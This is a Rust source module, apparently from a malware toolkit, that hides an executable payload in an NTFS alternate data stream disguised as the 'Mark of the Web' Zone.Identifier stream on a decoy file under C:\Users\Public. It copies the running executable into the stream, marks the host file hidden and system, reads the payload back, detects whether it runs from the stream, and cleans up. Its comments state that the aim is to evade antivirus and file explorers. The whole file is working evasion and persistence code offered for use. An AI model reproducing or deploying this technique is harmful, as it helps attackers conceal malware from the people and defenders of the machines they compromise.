//! # NTFS Alternate Data Streams (ADS)
//!
//! Hide payload in NTFS streams - invisible to file explorers.
//!
//! ## Target Path
//! `C:\Users\Public\Libraries\collection.dat:Zone.Identifier`
//!
//! ## Why Zone.Identifier?
//! - Windows uses this stream for "Mark of the Web"
//! - AV typically ignores this stream
//! - File appears as 0 bytes

use std::fs;
use std::io::{self, Read, Write};
use std::path::Path;
use log::{info, debug, warn};

// ============================================================================
// CONSTANTS
// ============================================================================

/// Legitimate-looking host file
const HOST_FILE: &str = r"C:\Users\Public\Libraries\collection.dat";

/// Stream name (mimics MOTW stream)
const STREAM_NAME: &str = "Zone.Identifier";

/// Get full ADS path
pub fn get_ads_path() -> String {
    format!("{}:{}", HOST_FILE, STREAM_NAME)
}

// ============================================================================
// INSTALLATION
// ============================================================================

/// Install payload to ADS
pub fn install_to_ads(payload: &[u8]) -> io::Result<String> {
    let host = Path::new(HOST_FILE);
    let ads_path = get_ads_path();
    
    // Ensure directory
    if let Some(parent) = host.parent() {
        fs::create_dir_all(parent)?;
    }
    
    // Create empty host file
    if !host.exists() {
        fs::File::create(host)?;
        debug!("[ADS] Created host: {}", HOST_FILE);
        set_hidden_attribute(host);
    }
    
    // Write payload to ADS
    let mut file = fs::File::create(&ads_path)?;
    file.write_all(payload)?;
    file.sync_all()?;
    
    info!("[ADS] Payload installed: {} ({} bytes)", ads_path, payload.len());
    Ok(ads_path)
}

/// Install current executable to ADS
pub fn install_self_to_ads() -> io::Result<String> {
    let exe_path = std::env::current_exe()?;
    let payload = fs::read(&exe_path)?;
    install_to_ads(&payload)
}

// ============================================================================
// READING
// ============================================================================

/// Read payload from ADS
pub fn read_from_ads() -> io::Result<Vec<u8>> {
    let ads_path = get_ads_path();
    let mut file = fs::File::open(&ads_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    debug!("[ADS] Read {} bytes", buffer.len());
    Ok(buffer)
}

// ============================================================================
// DETECTION
// ============================================================================

/// Check if running from ADS
pub fn is_running_from_ads() -> bool {
    if let Ok(path) = std::env::current_exe() {
        let s = path.to_string_lossy().to_lowercase();
        
        // Check for stream separator
        if s.contains(":zone.identifier") || s.contains("$data") {
            return true;
        }
        
        // Count colons (drive + stream = 2+)
        let colons: Vec<_> = s.match_indices(':').collect();
        if colons.len() > 1 {
            return true;
        }
    }
    false
}

/// Check if ADS payload exists
pub fn payload_exists() -> bool {
    Path::new(&get_ads_path()).exists()
}

// ============================================================================
// CLEANUP
// ============================================================================

/// Remove ADS payload
pub fn remove_ads() -> io::Result<()> {
    let path = get_ads_path();
    if Path::new(&path).exists() {
        fs::remove_file(&path)?;
        info!("[ADS] Removed: {}", path);
    }
    Ok(())
}

/// Remove everything
pub fn remove_all() -> io::Result<()> {
    remove_ads()?;
    if Path::new(HOST_FILE).exists() {
        fs::remove_file(HOST_FILE)?;
        info!("[ADS] Removed host: {}", HOST_FILE);
    }
    Ok(())
}

// ============================================================================
// WINDOWS HELPERS
// ============================================================================

#[cfg(windows)]
fn set_hidden_attribute(path: &Path) {
    use std::os::windows::ffi::OsStrExt;
    
    #[link(name = "kernel32")]
    extern "system" {
        fn SetFileAttributesW(lpFileName: *const u16, dwFileAttributes: u32) -> i32;
    }
    
    let wide: Vec<u16> = path.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
    
    unsafe {
        // FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
        SetFileAttributesW(wide.as_ptr(), 0x02 | 0x04);
    }
}

#[cfg(not(windows))]
fn set_hidden_attribute(_path: &Path) {}
